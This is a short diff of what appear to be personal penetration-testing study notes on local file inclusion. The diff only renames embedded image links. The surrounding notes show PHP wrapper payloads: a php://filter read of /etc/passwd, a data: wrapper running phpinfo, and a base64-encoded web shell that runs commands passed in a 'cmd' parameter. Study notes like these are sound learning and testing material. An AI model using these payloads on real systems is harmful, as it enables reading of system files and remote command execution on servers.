@@ -1,4 +1,4 @@
-![[Pasted image 20250115174919.png]]
+![[target files.png]]
 
 https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
 ### Tricks
@@ -12,10 +12,10 @@ https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.t
 * `php://filter/convert.base64-encode/resource=/etc/passwd`
 * `data:text/plain,<?php%20phpinfo();%20?>`
 
-![[Pasted image 20250121072829.png]]
+![[php filter.png]]
 
 
-![[Pasted image 20250121073240.png]]
+![[file links.png]]
 We will use the PHP code `<?php system($_GET['cmd']); echo 'Shell done!'; ?>` as our payload. The value of the payload, when encoded to base64, will be `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`
 
 
